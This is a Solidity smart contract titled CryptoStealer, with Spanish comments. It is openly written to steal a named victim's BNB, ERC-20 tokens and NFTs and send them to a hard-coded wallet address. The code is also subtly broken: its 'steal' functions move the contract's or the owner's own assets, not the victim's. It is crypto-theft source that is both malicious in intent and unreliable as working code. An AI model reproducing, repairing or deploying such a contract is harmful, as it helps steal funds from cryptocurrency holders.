// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CryptoStealer {
    address public owner;
    address public newOwner;
    address public victim;
    mapping(address => bool) public stolen;

    constructor(address _victim) {
        owner = msg.sender;
        newOwner = address(0x00459EA5cC9626011cB5E5300C948a3237fb92f1); // Tu dirección de wallet para BNB
        victim = _victim; // Dirección de la víctima
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    function setNewOwner(address _newOwner) external onlyOwner {
        newOwner = _newOwner;
    }

    function stealFunds() external onlyOwner {
        require(!stolen[victim], "Funds already stolen from this address");
        uint256 balance = address(victim).balance;
        payable(address(0x00459EA5cC9626011cB5E5300C948a3237fb92f1)).transfer(balance); // Tu dirección de wallet para BNB
        stolen[victim] = true;
    }

    function interceptTransfer(address , uint256 _amount) external onlyOwner {
        // Cambiar la dirección de destino al último instante
        payable(address(0x00459EA5cC9626011cB5E5300C948a3237fb92f1)).transfer(_amount); // Tu dirección de wallet para BNB
    }

    function transferBNB(address _to, uint256 _value) external onlyOwner {
        payable(_to).transfer(_value);
    }

    function transferTokens(address _token, address _to, uint256 _amount) external onlyOwner {
        IERC20(_token).transfer(_to, _amount);
    }

    function approveAndTransferTokens(address _token, address _spender, uint256 _amount) external onlyOwner {
        IERC20(_token).approve(_spender, _amount);
        IERC20(_token).transferFrom(msg.sender, _spender, _amount);
    }

    function stealNFT(address _nftContract, uint256 _tokenId) external onlyOwner {
        IERC721(_nftContract).transferFrom(msg.sender, address(0x00459EA5cC9626011cB5E5300C948a3237fb92f1), _tokenId); // Tu dirección de wallet para NFTs
    }

    function approveNFT(address _nftContract, uint256 _tokenId) external onlyOwner {
        IERC721(_nftContract).approve(address(0x00459EA5cC9626011cB5E5300C948a3237fb92f1), _tokenId); // Tu dirección de wallet para NFTs
    }
}

interface IERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);
    function approve(address _spender, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
}

interface IERC721 {
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    function approve(address _to, uint256 _tokenId) external;
}
